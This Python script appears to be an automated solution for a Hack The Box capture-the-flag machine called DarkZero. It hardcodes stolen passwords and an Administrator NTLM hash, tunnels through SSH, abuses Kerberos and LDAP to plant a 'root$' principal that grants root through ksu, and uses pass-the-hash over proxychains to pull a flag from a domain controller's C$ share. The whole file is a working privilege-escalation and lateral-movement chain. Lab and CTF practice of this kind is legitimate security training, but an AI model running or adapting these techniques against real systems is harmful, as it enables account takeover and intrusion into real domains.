#!/usr/bin/env python3
import argparse
import base64
import re
import shutil
import socket
import subprocess
import tempfile
import time
from pathlib import Path


JOSH_PASSWORD = "Rangers1"
CELIA_PASSWORD = "babygurl13"
ROOT_PASSWORD = "Yarrow6!Moss2"
HTB_ADMIN_NTLM = "4d470bb7497acf3f5f5c2a11872e02ac"
DC01 = "172.16.20.1"


def run(command, **kwargs):
    return subprocess.run(
        command,
        text=True,
        capture_output=True,
        check=True,
        **kwargs,
    )


def ssh_command(target, tty=False):
    command = ["sshpass", "-p", JOSH_PASSWORD, "ssh"]
    if tty:
        command.append("-tt")
    return command + [
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        f"josh@{target}",
    ]


def extract_flag(text, name):
    match = re.search(r"\b[0-9a-f]{32}\b", text, re.IGNORECASE)
    if not match:
        raise SystemExit(f"could not extract {name}")
    return match.group()


def create_root_principal(ssh):
    celia_cache = "/tmp/yarrow_celia.ccache"
    root_cache = "/tmp/yarrow_root.ccache"
    encoded_password = base64.b64encode(
        f'"{ROOT_PASSWORD}"'.encode("utf-16-le")
    ).decode()

    run(
        ssh
        + [
            f"printf '%s\\n' '{CELIA_PASSWORD}' | "
            f"KRB5CCNAME=FILE:{celia_cache} kinit celia@DARKZERO.EXT"
        ]
    )
    query = run(
        ssh
        + [
            f"KRB5CCNAME=FILE:{celia_cache} ldapsearch -LLL -Y GSSAPI -N "
            "-H ldap://dc02.darkzero.ext "
            "-b 'DC=darkzero,DC=ext' '(sAMAccountName=root$)' dn"
        ]
    ).stdout
    match = re.search(r"^dn:\s*(.+)$", query, re.MULTILINE)
    dn = (
        match.group(1)
        if match
        else "CN=Yarrow,OU=GiteaMigration,DC=darkzero,DC=ext"
    )

    if not match:
        run(
            ssh
            + [
                f"KRB5CCNAME=FILE:{celia_cache} "
                "ldapadd -Y GSSAPI -N -H ldap://dc02.darkzero.ext"
            ],
            input=f"""dn: {dn}
changetype: add
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Yarrow
sn: Yarrow
sAMAccountName: root$
userPrincipalName: root@darkzero.ext
unicodePwd:: {encoded_password}
userAccountControl: 512
""",
        )

    run(
        ssh
        + [
            f"KRB5CCNAME=FILE:{celia_cache} "
            "ldapmodify -Y GSSAPI -N -H ldap://dc02.darkzero.ext"
        ],
        input=f"""dn: {dn}
changetype: modify
replace: unicodePwd
unicodePwd:: {encoded_password}
-
replace: userAccountControl
userAccountControl: 512
-
replace: userPrincipalName
userPrincipalName: root@darkzero.ext
""",
    )
    run(
        ssh
        + [
            f"printf '%s\\n' '{ROOT_PASSWORD}' | "
            f"KRB5CCNAME=FILE:{root_cache} kinit root@DARKZERO.EXT"
        ]
    )
    return root_cache


def main():
    parser = argparse.ArgumentParser(description="DarkZeroReturns flag shortcut")
    parser.add_argument("target_ip")
    parser.add_argument("tun0_ip")
    args = parser.parse_args()

    if args.tun0_ip not in run(["ip", "-o", "-4", "addr", "show"]).stdout:
        raise SystemExit(f"{args.tun0_ip} is not assigned locally")
    for command in ("sshpass", "proxychains4", "nxc"):
        if not shutil.which(command):
            raise SystemExit(f"missing required command: {command}")

    ssh = ssh_command(args.target_ip)
    run(ssh + ["true"])

    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        socks_port = probe.getsockname()[1]

    socks = subprocess.Popen(
        ssh_command(args.target_ip)[:-1]
        + ["-N", "-D", f"127.0.0.1:{socks_port}", f"josh@{args.target_ip}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(2)
        if socks.poll() is not None:
            raise SystemExit("failed to establish the SSH SOCKS tunnel")

        root_cache = create_root_principal(ssh)
        root_shell = run(
            ssh_command(args.target_ip, tty=True)
            + [
                f"KRB5CCNAME=FILE:{root_cache} /usr/bin/ksu.mit root "
                f"-n root@DARKZERO.EXT -c FILE:{root_cache}"
            ],
            input="cat /home/svc-runner/user.txt\nexit\n",
        ).stdout
        user_flag = extract_flag(root_shell, "user.txt")

        with tempfile.TemporaryDirectory(prefix="yarrow-") as folder:
            folder = Path(folder)
            proxy_config = folder / "proxychains.conf"
            root_file = folder / "root.txt"
            proxy_config.write_text(
                "strict_chain\n"
                "proxy_dns\n"
                "tcp_read_time_out 30000\n"
                "tcp_connect_time_out 8000\n"
                "[ProxyList]\n"
                f"socks5 127.0.0.1 {socks_port}\n"
            )
            run(
                [
                    "proxychains4",
                    "-q",
                    "-f",
                    str(proxy_config),
                    "nxc",
                    "smb",
                    DC01,
                    "-u",
                    "Administrator",
                    "-H",
                    HTB_ADMIN_NTLM,
                    "-d",
                    "darkzero.htb",
                    "--share",
                    "C$",
                    "--get-file",
                    r"\Users\Administrator\Desktop\root.txt",
                    str(root_file),
                ]
            )
            root_flag = extract_flag(root_file.read_text(), "root.txt")

        print(f"user.txt: {user_flag}")
        print(f"root.txt: {root_flag}")
    finally:
        socks.terminate()
        try:
            socks.wait(timeout=3)
        except subprocess.TimeoutExpired:
            socks.kill()


if __name__ == "__main__":
    main()